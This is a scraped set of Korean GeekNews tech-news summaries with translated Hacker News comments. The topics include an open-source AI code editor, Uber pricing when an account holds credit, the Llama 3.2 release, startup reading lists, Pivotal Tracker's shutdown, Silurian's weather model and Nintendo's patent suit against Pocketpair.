     * VSCode를 플랫폼으로 사용해 앱을 리팩토링하려 했으나 UI 디자인 결정 때문에 어려움을 겪음
          + MS 마켓플레이스의 폐쇄성도 오픈 소스 목표에 도움이 되지 않음
          + Theia를 발견하고 오픈 소스 목표에 더 적합하다고 판단함
          + Theia는 VSCode 확장 API와 호환되며 완전한 모듈성을 제공함
     * 새로운 경쟁을 만드는 것은 좋지만, 대부분의 소프트웨어 포크는 실패함
          + Continue + Claude-dev 같은 오픈 소스 확장과 비교해 왜 새로운 에디터를 사용해야 하는지 설득해달라고 요청함
          + Microsoft의 확장 마켓플레이스는 폐쇄적이지만 Open VSX Registry가 존재함
     * AI 에디터 공간에서 더 많은 경쟁이 필요함
          + VSCode 확장으로 만들면 더 접근성이 높아질 것이라고 생각함
          + 확장 API의 제한이 있는지 궁금함
     * 프로젝트가 여기까지 온 것을 축하함
          + Cursor는 '탭-탭-탭-탭 자동 수정' 워크플로우를 잘 구현했음
          + Cursor의 핵심 기능을 목표로 하는지, 아니면 다른 것을 중점으로 하는지 궁금함
          + 확장 API를 사용한 검색 기능에서 어려움을 겪었음
          + Microsoft의 브랜드 가이드라인을 준수할 필요가 있음
          + 기여자를 모집하려면 Github 워크플로우와 CI를 정리할 필요가 있음
     * 전체 에디터를 소유해야 하는지 의문을 제기함
          + 상위 버전과의 동기화 유지가 어려움
          + 독립적인 플러그인 설치가 더 쉬움
          + Copilot 확장을 만들고 ollama 인스턴스를 연결하는 것이 더 나을 수 있음
     * 너무 초기 단계라 다운로드할 수 없음
          + Discord 서버에 가입할 이유가 없음
          + VS Code가 모든 기능을 도입하면 어떻게 할 것인지 궁금함
     * PearAI 등 여러 AI 코드 에디터가 존재함
          + Cursor, Continue, Double.bot, Supermaven, Codium.ai, PearAI, Void 등 경쟁이 치열함
     * 동일한 사용자가 4일 전에 게시한 다른 Show HN 게시물의 중복임
     * Omnivim2를 포크하여 VS Code와 경쟁할 수 있기를 바람
          + Omnivim2는 VS Code와 유사하지만 네이티브로 컴파일되며 VS Code 플러그인을 지원함
          + 웹 브라우저 기반의 개발 도구에 지침
          + 90년대와 00년대의 네이티브 앱이 더 단순했음
          + Omnivim2는 vim을 기반으로 하여 강점이 있음
"
"https://news.hada.io/topic?id=16892","계정에 크레딧이 있으면 요금을 더 부과하는 Uber","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      계정에 크레딧이 있으면 요금을 더 부과하는 Uber

  Uber가 과도한 요금을 부과하고 있는가? 계정에 크레딧이 있을 때 발생할 수 있는 비용 증가

    Gary Leff의 경험

     * 이달 초 Uber 앱을 사용하여 탑승 요청을 했음
     * 계정에 월 $15의 American Express Uber 크레딧이 있었음
     * 요금이 이 크레딧을 제외한 금액으로 표시되었음
     * 요금이 평소보다 높았고 Lyft보다도 훨씬 높았음
     * 크레딧이 계정에 있을 때 Uber가 더 높은 요금을 선택하는 것 같다는 가설을 세웠음
     * Uber Eats에서 크레딧을 사용했을 때는 가격이 정상적이었음

    독자 Charles의 경험

     * 정기적으로 Uber를 예약하여 사용함
     * Costco에서 20% 할인된 Uber 기프트 카드를 구매했음
     * $50 카드를 계정에 충전했을 때는 정상적으로 작동했음
     * $200을 추가로 충전한 후 공항으로 가는 Uber를 예약했을 때, Uber Cash로 결제할 수 없었음
     * 동일한 경로의 요금이 약 $20에서 $30로 증가했음
     * 다른 사람의 전화기로 확인했을 때는 평소 요금인 $20이었음

    의문점과 가설

     * Uber가 일부 사용자에게 테스트를 진행하고 있을 가능성이 있음
     * Dara Khosrowshahi가 CEO로 취임한 후, 운전자의 수입이 줄어들고 고객에게는 더 비싸졌음
     * ""서지 요금""이 사라지고, 고지 없이 더 높은 요금을 부과하고 있음

  GN⁺의 정리

     * Uber가 계정에 크레딧이 있을 때 더 높은 요금을 부과하는 것 같음
     * 이는 사용자에게 친절하지 않은 방식으로 보임
     * Dara Khosrowshahi의 취임 이후 Uber의 요금 정책이 더 불투명해졌음
     * Lyft와 같은 대안 서비스를 고려해볼 만함

        Hacker News 의견

     * Uber가 배터리가 낮을 때 요금을 더 부과한다는 도시 전설은 사실이 아닐 가능성이 높음
          + 이러한 주장들은 입증하기 어렵고 클릭을 유도하기 때문에 바이럴됨
          + 실제로는 사람들이 다른 요금제를 선택하거나 여러 휴대폰이 동일한 경로를 검색하여 수요가 증가하는 경우로 설명될 수 있음
          + 제대로 된 실험은 다양한 시나리오에서 여러 휴대폰을 사용해 무작위로 검색을 수행하고 변수를 가격과 연관시키는 것임
          + 개인적으로 Uber와 Lyft를 비교했을 때 Uber가 약간 더 저렴했음
     * 계정에 크레딧이 있으면 할인 혜택을 받지 못하는 것은 일반적인 지식임
          + Uber Eats는 종종 25-40% 할인된 가격으로만 사용할 수 있음
     * Google Maps를 익명으로 시작하고 승차 공유 버튼을 누르면 Uber, Lyft 등의 가격을 비교할 수 있음
          + 앱을 통해 시작하는 것보다 가격이 일관되게 낮음
     * 사용자 계정에 크레딧이 있으면 요금을 더 부과하는 것은 악의적인 의도가 아닐 수 있음
          + 머신러닝 모델이 사용자 정보를 입력으로 받아 가격을 결정할 수 있음
          + 크레딧 잔액도 입력 변수 중 하나일 수 있음
          + A/B 테스트를 통해 수익이 1.3% 증가한 것을 보고 이를 도입했을 수 있음
     * Uber에 대해 부정적인 의견을 가지고 있는 사람들은 확인 편향을 가질 수 있음
          + 동적 가격 책정은 주식 시장 가격처럼 수백 가지 요인에 따라 빠르게 변동됨
          + 친구의 휴대폰과 비교하면 다른 가격을 볼 수 있음
     * Uber가 친구들보다 20%-50% 더 많은 요금을 부과한 경험이 있음
          + Uber 지원팀이 이를 인정하고 가격 멀티플라이어를 재설정할 수 없다고 말함
          + 계정을 삭제하고 새 이메일 주소로 새 계정을 만들었더니 가격이 정상으로 돌아옴
     * 이러한 기능을 코딩한 개발자들이 자신에 대해 어떻게 생각하는지 궁금함
          + 소프트웨어 개발에 대한 규제가 더 필요하다고 생각함
     * 현대 기술의 목적은 모든 거래에서 최대한의 이익을 추출하는 것임
     * Uber가 가장 윤리적인 회사로 알려져 있지 않음
     * 계정에 크레딧이 있는 사용자는 더 헌신적인 소비자일 수 있음
          + 자주 사용하는 사용자는 더 헌신적이기 때문에 할인을 덜 받을 수 있음
"
"https://news.hada.io/topic?id=16935","Meta Llama 3.2 출시 - 개방형 맞춤형 모델로 엣지 AI와 비전을 혁신하는 기술","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           Meta Llama 3.2 출시 - 개방형 맞춤형 모델로 엣지 AI와 비전을 혁신하는 기술

     * Meta, Llama 3.2 출시
          + 소형 및 중형 비전 LLM(11B 및 90B)과 경량 텍스트 전용 모델(1B 및 3B) 포함
          + Qualcomm 및 MediaTek 하드웨어에서 사용 가능하며 Arm 프로세서에 최적화됨
          + 요약, 지시 따르기, 재작성 작업에 적합한 모델
     * Llama 3.2 모델의 특징
          + 11B 및 90B 비전 모델은 이미지 이해 작업에서 뛰어남
          + torchtune을 사용한 맞춤형 애플리케이션을 위한 미세 조정 가능
          + torchchat을 사용한 로컬 배포 가능
          + Meta AI 스마트 어시스턴트를 통해 사용 가능
     * Llama Stack 배포
          + 단일 노드, 온프레미스, 클라우드, 온디바이스 환경에서 Llama 모델 작업을 단순화
          + AWS, Databricks, Dell Technologies, Fireworks, Infosys, Together AI와 협력하여 배포
     * Llama 3.2 모델 다운로드
          + llama.com 및 Hugging Face에서 다운로드 가능
          + AMD, AWS, Databricks, Dell, Google Cloud, Groq, IBM, Intel, Microsoft Azure, NVIDIA, Oracle Cloud, Snowflake 등 파트너 플랫폼에서 즉시 개발 가능
     * Llama 3.2의 성능
          + 11B 및 90B 모델은 문서 수준 이해, 이미지 캡션 작성, 시각적 기반 작업에 적합
          + 1B 및 3B 모델은 다국어 텍스트 생성 및 도구 호출 기능 제공
          + 로컬에서 실행 시 즉각적인 응답과 높은 프라이버시 유지
     * 모델 평가
          + 150개 이상의 벤치마크 데이터셋에서 성능 평가
          + Claude 3 Haiku 및 GPT4o-mini와 경쟁 가능한 성능
     * 비전 모델
          + 이미지 입력 지원을 위해 새로운 모델 아키텍처 도입
          + 텍스트 전용 기능을 유지하면서 이미지와 텍스트 프롬프트를 결합하여 깊이 있는 이해와 추론 가능
     * 경량 모델
          + 가지치기 및 지식 증류 방법을 사용하여 1B 및 3B 모델 개발
          + 로컬에서 효율적으로 실행 가능
     * Llama Stack 배포
          + Llama Stack API를 통해 표준화된 인터페이스 제공
          + 다양한 환경에서 Llama 모델 작업을 단순화
     * 시스템 수준 안전
          + Llama Guard 3 11B Vision 출시
          + Llama Guard 3 1B 모델은 배포 비용을 크게 줄임
     * Llama 3.2 사용
          + 개발자에게 필요한 도구와 리소스 제공
          + Llama 3.2와 Llama Stack을 사용하여 혁신적인 애플리케이션 개발 가능

GN⁺의 정리

     * Llama 3.2는 엣지 및 모바일 디바이스에서 실행 가능한 경량 모델을 포함하여 다양한 비전 및 텍스트 모델을 제공함
     * Qualcomm, MediaTek, Arm 등과의 협력을 통해 다양한 하드웨어에서 최적화된 성능을 제공함
     * Llama Stack 배포를 통해 개발자들이 다양한 환경에서 쉽게 Llama 모델을 사용할 수 있도록 지원함
     * Llama 3.2는 높은 프라이버시와 즉각적인 응답을 제공하여 로컬 애플리케이션 개발에 적합함
     * Claude 3 Haiku 및 GPT4o-mini와 경쟁할 수 있는 성능을 제공하며, 다양한 벤치마크에서 우수한 성능을 입증함

        Hacker News 의견

     * 새로운 1B 모델의 성능에 놀라움. 1.3GB 다운로드 크기임
          + 전체 코드베이스를 요약하는 데 사용해봄. 완벽하지는 않지만 작은 모델치고는 놀라운 성능을 보임
          + 더 많은 노트는 여기에서 확인 가능함
          + 더 큰 이미지 모델도 시도해봄. lmarena.ai에서 ""Direct Chat""을 통해 이미지 업로드 가능함
     * ""The Llama jumped over the ______!"" 예제에서 1-hot 인코딩으로 ""wall""이 100% 확률로 정답임
          + ""fence""도 가능성이 있다고 하면 틀림. 모델 증류가 잘 작동하는 이유라고 생각함
          + 원래 모델은 텍스트 답변을 통해 학습하지만, 자식 모델은 예측을 모방하여 더 의미 있는 답변을 학습함
          + Meta의 Llama 3.2 모델이 작지만 강력한 이유를 이해함. 모델의 발전에 놀라움
     * Meta의 Llama 팀의 개방성에 감탄함. 모델 접근뿐만 아니라 구축 방법도 공개함
          + 미래의 모델에 대해 알 수 없지만, Meta의 개방적인 태도에 감사함
     * 초보자 질문: 10배의 소프트웨어 엔지니어 능력을 가진 모델이 필요한데, 인간의 지식은 필요 없음. 그런 모델이 있는지 궁금함
     * Ollama에서 3B 모델을 사용해봄. 광학, 생물학, Rust에 대한 질문에 빠르고 많은 지식을 가지고 있음
          + 매우 인상적인 모델임
     * Ollama 블로그 포스트: 링크
     * llama3.2:3b-instruct-q8_0 모델이 3.1 8b-q4보다 성능이 좋음. MacBook Pro M1에서 더 빠르고 결과도 더 좋음
          + 몇 가지 수수께끼와 사고 실험에 더 나은 답변을 제공함
          + 3.1-8b 설치를 제거함
          + 현재 Ollama 리스트:
               o llama3.2:3b-instruct-q8_0: 3.4GB, 2시간 전 수정됨
               o gemma2:9b-instruct-q4_1: 6.0GB, 3일 전 수정됨
               o phi3.5:3.8b-mini-instruct-q8_0: 4.1GB, 3일 전 수정됨
               o mxbai-embed-large:latest: 669MB, 3개월 전 수정됨
     * Ollama를 위한 웹 UI 클라이언트를 추천해줄 수 있는지 질문함
     * 최신 LLM 벤치마크가 있는 리더보드가 있는지 질문함
          + Livebench와 Lmsys는 몇 주 뒤처져 있고 주요 모델을 추가하지 않음
          + 존재하지 않으면 직접 만들 의향이 있음
     * 3B 모델이 멀티모달(노르웨이어)에서 꽤 좋았지만, 때때로 의미 없는 답변을 많이 함. 8B보다 민감하지만 Gemma 2 2B보다 사용 가능함
          + Python 리스트 정렬 질문에는 괜찮음
          + 90B 비전 모델은 유용한 작업을 거부함. HTML로 이미지를 재현하거나 이미지 데이터를 유용하게 사용하는 데 실패함
          + 70B나 OpenAI에서는 이런 문제가 없었음. 거부가 너무 많음
"
"https://news.hada.io/topic?id=16895","Ask HN: 스타트업을 위한 필독도서가 있을까요?","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      Ask HN: 스타트업을 위한 필독도서가 있을까요?

     * ""The Mom Test""를 읽고나서 ""아이디어에 투자하기 전에 잠재 고객과 대화하여 원하는 사람이 있는지 확인할 것"" 이라는 중요한 것을 배웠음
     * 그외에 추천할만한 다른 책들이 있는지 궁금하다는 해커뉴스 질문에 대한 답변들 정리

sebastiennight

     * 제목만 보고 ""The Mom Test""를 추천하려고 들어왔는데 그 내용이 있어서 더 적어봄
          + 내가 현재 스타트업을 시작할 때 가장 중요하게 읽은 책이고, MVP가 나오기도 전에 첫 판매를 하게 된 계기가 된 책이기도 함
     * 그 책의 주요 교훈
          + 사람들에게 아이디어에 대해 이야기하지 말고, 실제 사용 사례와 불만 사항에 대해 물어보세요.
          + 고객이 어디에 어려움을 겪고 있는지, 노력과 비용을 투자하고 있는지 파악하세요. 그들이 이야기하게 하세요
          + 사람들에게 아이디어에 대해 물어보거나 원하는지 여부를 묻지 마세요. 당신은 단지 문제를 확인하려는 것뿐입니다.
     * 물어야할 질문들
          + [이 일을 하면서] 가장 힘들었던 점은 무엇인가요?
          + 마지막으로 그 문제에 직면했을 때에 대해 이야기 해 주세요
          + 왜 그렇게 힘들었나요?
          + 문제를 해결하기 위해 시도한 것이 있다면 무엇인가요?
          + 시도한 솔루션의 어떤 점이 마음에 들지 않나요?

lcordier

     * ""The new business road test"" - John Mullins
     * ""Will it fly"" - Pat Flynn
     * ""Start marketing"" - Rob Walling ([eBook PDF 링크]](https://robwalling.com/assets/ebook.pdf))
     * 유튜브 Superhuman CEO Rahul Vohra on ""Building a Product Market Fit Engine + Future of Angel Investing""
     * 아이디어는 실행하지 않으면 아무 가치가 없습니다. 아이디어는 단지 Multiplier 뿐입니다. 실행은 수백만 달러의 가치가 있습니다.

  Explanation:
  AWFUL IDEA           -1
  WEAK IDEA             1
  SO-SO IDEA            5
  GOOD IDEA            10
  GREAT IDEA           15
  BRILLIANT IDEA       20

  NO EXECUTION         $1
  WEAK EXECUTION       $1000
  SO-SO EXECUTION      $10,000
  GOOD EXECUTION       $100,000
  GREAT EXECUTION      $1,000,000
  BRILLIANT EXECUTION  $10,000,000

     * 비즈니스를 하려면 두 가지를 곱해야 함 ( Derek Sivers 의 ""Ideas are just a Multiplier of Execution (2005)"")
          + 아무리 기발한 아이디어도 실행이 없으면 20달러의 가치가 있고,
          + 아무리 기발한 아이디어도 훌륭한 실행이 있어야 20만달러의 가치가 있음
          + 그래서 나는 사람들의 아이디어를 듣고 싶지 않음
          + 실행을 보기 전에는 관심을 두지 않음

code_biologist

     * Steve Blank의 'Four Steps to the Epiphany'의 첫 25페이지(스탠퍼드 수업용 PDF)
     * ""The Mom Test"" 와 매우 유사하게 들리지만 훨씬 다른 각도에서 제시됨
          + 고객에 대한 이해보다 제품에 지나치게 집중하는 스타트업의 실패 모드를 진단함
     *

     Validate, Validate, Validate. ""정말 멋지네요""라는 말은 고객의 Validation이 아님. ""정말 멋지네요. 갖고 싶어요. 비용은 얼마인가요?""라는 질문이 고객의 Validation임

l5870uoo9y

     * Cal Newport의 Deep Work는 스타트업에 관한 책은 아니지만 가치 있는(잠재적으로 금전적 가치도 있는) 일을 하는 데 중요한 통찰력을 제공
     * 스타트업은 1000가지의 다양한 방식으로 운영될 수 있으며, 특히 1인 스타트업은 어려운 문제를 해결한다는 공통점이 있으며, 이를 위해서는 심층적인 작업이 필요

mklepaczewski

     * 스타트업의 단계에 따라 다름
     * 아직 존재하지 않는다면(제출한 내용을 보면 존재하지 않는 것 같음) ""The Mom Test""를 읽은 후 시작할 수 있음. Lean Startup 을 읽는 것도 좋음
     * 하지만 수십 권의 책을 읽어도 여전히 연구 단계에 머물러 있을 수 있음. 독서만으로는 스타트업을 만들 수 없음
     * ""The Mom Test""를 이해하고 그 지식을 적용한다면 시작할 준비가 된 것
     * 스타트업을 시작하기 위해 수백 권의 책을 읽은 사람들의 조언은 실제로 스타트업을 만들 시간이 없었을 수 있으므로 주의할 것
     *

     ""아이디어를 검증하고 (희망적으로) 구축을 시작하세요. 행운을 빕니다!""
     * Etheryte의 대댓글 :

     ""회사 운영은 일종의 스포츠와 같다고 생각할 수 있습니다. 평생 책을 읽으면서도 직접 나가서 격렬하게 연습하지 않으면 좋은 선수가 될 수 없습니다.""

kqr

     * 다소 파격적이지만, Wheeler의 ""Understanding Variation"" 과 Deming의 ""A New Economics""은 사람들에게 과거와 미래를 더 효과적으로 해석하는 방법을 가르쳐준다고 생각
     * 이 책들을 읽지 않고는 초기 단계의 회사를 운영하는 것은 물론이고 인생을 살아가고 싶지 않을 것

atomicnature

     * Admiral Rickover 의 Doing Job: https://govleaders.org/rickover.htm
     * 이 한 페이지짜리 가이드는 길을 잃었다고 느낄 때마다 나를 바로잡아줌
     * 시간이 더 있다면 리커버가 쓴 모든 글을 읽어 보시기 바람. 평생 동안 도움이 될 것

chung8123

     * ""The E-Myth Revisited: Why Most Small Businesses Don't Work and What to Do About It""은 비즈니스의 엔진을 구축하는 방법에 대한 사고방식과 프로세스에 대한 좋은 책이라고 생각
          + senkora의 대댓글: Cortex 팟캐스트 https://www.relay.fm/cortex/21 에서 요약을 볼 수 있음(그들은 책에 좋은 아이디어가 있긴 하지만 너무 길다는 의견)

yas_hmaheshwari

     * 당신의 스타트업 아이디어가 '네트워크 제품' 영역에 있다면 Andrew Chen의 ""The Cold Start Problem""을 읽어볼 것. 책을 3번이나 다시 읽었는데, 정말 훌륭

gmuslera

     * Nassim Taleb의 Incerto 시리즈, 특히 ""The Black Swan"" 과 ""Antifragile"". 미래에 대한 예측은 어렵지만, 몇 가지 좋은 휴리스틱이 도움이 될 수 있음

anssip

     * Eric Ries의 ""The Lean Startup""을 추천. MVP 개념을 세상에 소개한 고전
     * 그리고 조금 다른 접근 방식을 원하신다면 Pieter Levels의 ""Make""를 추천. 이 책도 많은 아이디어를 시도해보고 확실한 것을 찾되, 좀 더 직접적인 접근 방식을 권장

pryelluw

     * ""The ultimate sales letter""를 읽어볼 것
     * 이 책은 매우 성공적인 카피라이터가 쓴 오래된 책으로, 나에게 많은 돈과 많은 성공을 가져다주었음 (여전히 그러함). 매년 읽고 있음

statictype

     * ""The Hard Thing About Hard Things - Ben Horowitz"" 이게 아마 최고일 것
     * ""Shoe Dog - Phil Knight"" 나이키가 어떻게 시작되었는지에 대한 훌륭한 책. 하지만 책이 나이키가 상장하는 것으로 끝날 뿐 80년대 후반/90년대의 상승세와 그 이후를 다루지 않아서 아쉬움이 있음

flpm

     * 나는 스타트업 업계에 종사하지는 않지만, 비슷한 주제를 다룬 Teresa Torres의 ""Continuous Discovery Habits""도 좋은 읽을거리가 될 것 같음
     * 이 책에서는 비즈니스 요구와 고객의 요구를 관리하고 결과와 산출에 초점을 맞추는 방법에 대해 이야기함
     * 고객과 지속적으로 소통하여 가정을 검증하는 방법 등 일반적으로 인간 중심 디자인에 관한 모든 것이 유용할 수 있음

mannyv

     * ""Traction: How Any Startup Can Achieve Explosive Customer Growth""
     * 당신의 스타트업 직원 중 한 명은 이 글을 읽어 봤을 것. 다양한 판매 채널에 대한 설명

   국내 기업을 다룬 책 중에는 크래프톤 웨이가 글솜씨도 내용도 좋더라구요

   한국어판이 나온게 별로 없네요. 그냥 아마존 링크로 모아봅니다.
     * The Mom Test
     * The New Business Road Test
     * Will it fly
     * Four Steps to the Epiphany
     * Deep Work
     * Understanding Variation
     * The Ultimate Sales letter
     * A New Economics
     * Continuous Discovery Habits
     * Traction: How Any Startup Can Achieve Explosive Customer Growth

   Four Steps to the Epiphany의 다음 저서
   The starup's owner manual의 번역서
   기업 창업가 매뉴얼, 에이콘 이 있습니다

   The Mom test는 비공식으로 한글로 번역해뒀는데 판권 협의가 되지 않아서 내놓지를 못하고 있습니다 ㅠㅡㅜ 정말 사고 싶은데요..

   아, 그리고 Traction: How Any Startup Can Achieve Explosive Customer Growth 은 판권 협의되어서 책 곧 나올 예정입니다. 나오면 긱뉴스에도 내용 요약해서 한번 올리겠습니다!

   기대 되네요!
"
"https://news.hada.io/topic?id=16846","Pivotal Tracker 서비스 종료","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         Pivotal Tracker 서비스 종료

     * VMware Tanzu 부서에서 Pivotal Tracker 서비스의 종료(EOL)를 발표
     * 2025년 4월 30일까지 Pivotal Tracker 구독을 사용할 수 있으며, 이후 서비스가 종료됨
          + 그 전에 데이터를 내보내는 것을 권장
          + 2025년 4월 30일 이후에는 데이터 마이그레이션 지원이 제공되지 않음

  FAQ

     * 어떤 계정이 영향을 받는가?
          + 무료, 후원(학술 또는 비영리), 월간/연간 유료, 엔터프라이즈 구독 플랜을 포함한 모든 계정이 영향을 받음
          + 2025년 4월 30일까지 사용 가능하며, 이후 갱신이나 거래는 발생하지 않음
     * 프로젝트 데이터를 어떻게 다운로드하는가?
          + 프로젝트 스토리, 에픽, 히스토리 및 파일 첨부를 내보내는 방법에 대한 도움말 센터의 CSV 내보내기 문서를 참조할 수 있음
          + 새로운 정보와 피드백을 바탕으로 추가 지침이 도움말 센터에 추가될 예정임
     * 과거 인보이스에 접근할 수 있는가?
          + 기존의 플랜 및 청구 페이지에서 과거 인보이스에 접근할 수 있음
     * 새로운 사용자나 계정을 생성할 수 있는가?
          + 초대 없이 Tracker에 가입하거나 새로운 계정을 생성할 수 없음
          + 그러나 협력자 한도를 초과하지 않는 한, 계정/프로젝트에 새로운 사용자를 초대할 수 있음

        Hacker News 의견

     * Pivotal Tracker는 뛰어난 티켓 추적 및 프로젝트 관리 시스템이었음
          + 클라이언트 관계 관리가 쉬웠고, 기능 요청의 영향을 명확히 보여줌
          + UI가 훌륭하고 사용하기 즐거웠음
          + PT 팀에게 감사의 마음을 전함
     * Pivotal Tracker를 클론하는 비즈니스 아이디어 제안
          + 많은 사람들이 좋아하는 제품이 사라질 때 기회가 생김
          + 소규모 팀이나 개인 개발자가 현대 기술을 사용해 클론 가능
          + 작은 규모로 유지하여 비용을 관리하고 수익성 있는 회사로 성장 가능
     * Pivotal Tracker의 장점
          + 하나의 큐만 존재하여 우선순위를 명확히 함
          + ""모든 것이 높은 우선순위""라는 딜레마를 피함
     * Pivotal Tracker는 사용하기 쉬웠고, 커스터마이징이 제한적이었음
          + Jira와 비교하여 간단하고 집중된 도구였음
     * Pivotal Tracker가 삶을 바꿨다는 의견
          + 소프트웨어 및 제품 개발, 페어 프로그래밍, 속도 관리 등 많은 것을 배움
          + 매일 이러한 기술을 사용함
     * Shortcut은 Pivotal Tracker의 대안으로 제안됨
          + GitHub, Gitlab, Bitbucket, Slack과의 통합이 잘 되어 있음
     * 오픈 소스 셀프 호스팅 추적/프로젝트 관리 도구에 대한 질문
          + Phabricator를 셀프 호스팅했으나 유지보수자가 떠남
          + 셀프 호스팅 솔루션의 수요가 줄어듦
     * Pivotal Tracker는 단순하고 사용하기 쉬운 도구였음
          + 팀이 하루 종일 창을 열어두고 필요할 때마다 변경 가능했음
     * 현재 직장에서 Jira를 사용하지만 복잡함
          + 이전 직장에서 사용한 Pivotal Tracker는 단순하고 집중된 도구였음
     * 37Signals가 Pivotal Tracker와 같은 도구를 클론하여 판매하길 바람
"
"https://news.hada.io/topic?id=16809","실루리안 (YC S24) 출시 – 지구 시뮬레이션 기술","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     실루리안 (YC S24) 출시 – 지구 시뮬레이션 기술

     * 우리는 Jayesh, Cris, Nikhil이며, Silurian 팀의 일원임. Silurian은 지구를 시뮬레이션하는 기초 모델을 구축하며, 날씨 예측을 시작으로 하고 있음. 최근 허리케인 예측 결과는 여기에서 시각화할 수 있음
     * 날씨 예측을 하루 더 일찍 알 수 있다면 그 가치는 얼마나 될까? 전통적인 예측 시스템은 10년마다 하루씩 예측 정확도가 향상되고 있음. 하지만 최근 몇 년간 GPU와 현대 딥러닝 기술 덕분에 이 속도가 빨라지고 있음
     * 2022년 이후 NVIDIA, Google DeepMind, Huawei, Microsoft 등에서 날씨 딥러닝 시스템 연구가 활발히 진행되고 있음. 이 모델들은 물리학을 거의 내장하지 않고 데이터만으로 예측을 학습함. 놀랍게도, 이 접근 방식이 전통적인 대기 물리학 시뮬레이션보다 더 나은 예측을 제공함
     * Jayesh와 Cris는 각각 Microsoft의 ClimaX와 Aurora 프로젝트를 이끌면서 이 기술의 잠재력을 직접 경험함. 그들이 구축한 기초 모델은 날씨 예측의 금표준으로 여겨지는 ECMWF의 예측을 개선했으며, 사용된 훈련 데이터는 극히 일부였음. Silurian의 목표는 이 모델들을 최대한 확장하고 물리적 예측의 한계까지 밀어붙이는 것임. 궁극적으로는 에너지 그리드, 농업, 물류, 국방 등 날씨에 영향을 받는 모든 인프라를 모델링하는 것임. 즉, 지구를 시뮬레이션하는 것임
     * 이번 여름, 우리는 GFT (Generative Forecasting Transformer)라는 1.5B 파라미터 프론티어 모델을 구축했음. 이 모델은 약 11km 해상도로 최대 14일간의 글로벌 날씨를 시뮬레이션함. 역사적 기록에 극단적인 날씨 데이터가 부족함에도 불구하고, GFT는 2024년 허리케인 경로 예측에서 매우 뛰어난 성과를 보이고 있음. 여기에서 우리의 허리케인 예측을 확인할 수 있음. 우리는 cambecc/earth라는 오픈 소스 날씨 시각화 도구를 사용하여 이를 시각화함
     * HN에서의 출시에 매우 흥분되며, 여러분의 의견을 듣고 싶음

GN⁺의 정리

     * Silurian은 날씨 예측을 시작으로 지구를 시뮬레이션하는 기초 모델을 구축하는 회사임
     * 최근 몇 년간 딥러닝 기술의 발전으로 날씨 예측의 정확도가 크게 향상되고 있음
     * Silurian의 GFT 모델은 극단적인 날씨 데이터가 부족함에도 불구하고 뛰어난 예측 성과를 보이고 있음
     * 이 기술은 에너지, 농업, 물류 등 다양한 인프라에 적용될 수 있는 잠재력을 가짐
     * 유사한 기능을 가진 프로젝트로는 NVIDIA와 Google DeepMind의 날씨 딥러닝 시스템이 있음

        Hacker News 의견

     * 열대성 저기압의 앙상블 예측을 할 수 있게 되어 기쁨
          + ML 모델과 ECMWF의 HRES 모델을 비교하는 것에 실망
          + HRES는 평균 날씨의 최적 추정이 아닌 가능한 날씨의 단일 실현임
          + NeuralGCM이 WeatherBench 리더보드에서 상위에 있음
          + 모델의 성능을 WeatherBench에서 비교하고 싶음
     * 물리학을 내장하지 않은 모델이 데이터만으로 더 나은 예측을 함
          + ""언어학자를 해고할 때마다 성능이 올라간다""는 NLP 격언이 물리학자에게도 적용됨
     * Silurian이 지구를 시뮬레이션하는 기초 모델을 구축함
          + 성공하면 무엇을 더 시뮬레이션하고 싶은지 궁금함
     * ClimaX의 상업적 잠재력에 대해 흥분함
          + 특정 산업이 상업적 잠재력에 대해 연락했는지 궁금함 (예: 천연 자원 탐사)
     * 비영리 단체로서 토지에 대한 유사 모델을 구축함
          + 토지 마스크를 토지 임베딩으로 대체하는 데 도움을 주고 싶음
          + 이는 지역 효과를 다운스케일링하는 데 크게 도움이 될 것임
     * Google이 작년에 출시한 GraphCast와 비교해 어떻게 다른지 궁금함
     * 날씨 모델이 혼란스러움
          + ML 방법이 물리 기반 시뮬레이션보다 수치적으로 안정적인지 궁금함
          + 계산 요구 사항 측면에서 어떻게 비교되는지 궁금함
          + 과거에 FORTRAN에서 Verilog로 모델을 변환한 경험이 있음
     * 예측 불가능한 지진에 이 접근법을 적용해본 적이 있는지 궁금함
     * 이 접근법이 ""The Bitter Lesson""의 또 다른 사례인 것 같음
     * 미래에 무엇을 더 시뮬레이션할지 궁금함
          + 샌프란시스코에서 자연어로 객체를 검색할 수 있는 데모를 구축함
          + Clay 임베딩을 사용해봤지만 CLIP으로 미세 조정된 OSM 캡션 임베딩보다 성능이 떨어짐
"
"https://news.hada.io/topic?id=16841","닌텐도, Palworld 개발사 PocketPair 상대로 특허권 침해 소송 제기 ","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             닌텐도, Palworld 개발사 PocketPair 상대로 특허권 침해 소송 제기

     * 2024년 9월 18일, 닌텐도는 Pokémon Company와 함께 PocketPair를 상대로 도쿄 지방 법원에 특허 침해 소송을 제기함
     * 포켓페어사가 개발하고 출시한 게임 '팔월드(Palworld)'가 복수의 특허권을 침해했다는 이유로 침해 금지 명령과 손해 배상을 구하는 소송임
     * 닌텐도는 오랫동안 구축해온 지적 재산권 보호를 위해 닌텐도 브랜드 자체를 포함한 지적 재산권 침해에 대해 필요한 조치를 계속 취할 것임

   이 소송은 저작권 소송이 아니라 ""특허권 침해 소송"" 입니다.

   닌텐도가 가진 게임 관련 특허들은 엄청나게 많습니다.

   팰월드 특허권침해로 고소한 닌텐도가 가진 특허권들을 알아보자

   맘먹고 잡으려고 하면 온동네방네 소송을 다 걸수 있지만 그냥 보고만 있는게 많은데요.
   어떤 걸로 특허 소송을 한건 지 궁금하네요.

   소개된 내용 중에서는 이미 만료가 된 특허도 있는 것 같네요?

   이에 대해 Palworld 의 공식 대응은 이렇습니다.
   https://www.pocketpair.jp/news/news16

     어제 당사에 특허 침해에 대한 소송이 제기되었습니다.
     당사는 이 소송에 대한 통지를 받았으며 특허 침해 주장에 대한 적절한 법적 절차 및 조사를 시작할 것입니다.
     현재 당사는 침해 혐의를 받고 있는 구체적인 특허에 대해 알지 못하며 그러한 세부 사항에 대해 통지받지 못했습니다.
